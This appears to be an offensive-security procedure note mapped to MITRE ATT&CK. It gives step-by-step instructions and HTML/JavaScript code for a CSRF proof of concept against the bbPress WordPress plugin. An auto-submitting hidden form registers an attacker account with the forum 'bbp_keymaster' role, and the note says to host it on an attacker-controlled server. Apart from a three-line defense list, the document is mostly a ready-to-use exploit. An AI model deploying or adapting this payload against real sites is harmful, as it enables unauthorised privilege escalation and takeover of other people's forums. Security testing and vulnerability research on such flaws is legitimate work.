---
tags:
  - csrf
  - poc
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:18.694Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: f22a0e8e-9c07-455e-84ee-ab7052b6a8c5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-CSRF-PoC-for-Malicious-User-Registration

## Summary

This procedure creates a proof-of-concept HTML form that exploits the CSRF vulnerability in bbPress by auto-submitting registration data with a role override to 'bbp_keymaster'.

## Description

The bbPress plugin's bbp_user_add_role_on_register hook allows the 'bbp-forums-role' POST parameter to call bbp_profile_update_role() without nonce checks during wp_insert_user(). The PoC simulates this by targeting wp-login.php?action=register, injecting user_login, user_email, and the malicious role. Host this on an attacker-controlled server for delivery.

## Requirements

1. Knowledge of target site's wp-login.php endpoint
2. Text editor for HTML creation
3. Web server to host the PoC (e.g., local Python server)

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all POST forms
- Enable WordPress nonces for registration
- Monitor for unusual user registrations from admin sessions

## Objectives

1. Generate a form that bypasses CSRF protections
2. Override user role during registration
3. Trigger email credential delivery

## Instructions

### Step 1: Create HTML Form Structure

**Context**: Build the basic form with target action and hidden inputs.

**Instructions**: Write HTML with form method='POST' action='https://target.com/wp-login.php'.

```html
<form id="csrf-poc" method="POST" action="https://target.com/wp-login.php">
    <input type="hidden" name="action" value="register">
    <input type="hidden" name="user_login" value="evilpen">
    <input type="hidden" name="user_email" value="attacker@email.com">
    <input type="hidden" name="bbp-forums-role" value="bbp_keymaster">
</form>
```

> Expected output: Valid HTML form skeleton.

### Step 2: Add Auto-Submit Script

**Context**: Ensure the form submits automatically upon page load.

**Instructions**: Append JavaScript to submit the form.

```html
<script>document.getElementById('csrf-poc').submit();</script>
```

> Expected output: Page loads and form submits without user interaction.

### Step 3: Test PoC Locally

**Context**: Verify the form works against a test WordPress site.

**Instructions**: Host the HTML and visit; check if user registers with elevated role.

> Expected output: New user 'evilpen' created with 'bbp_keymaster' role.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- poc
- registration
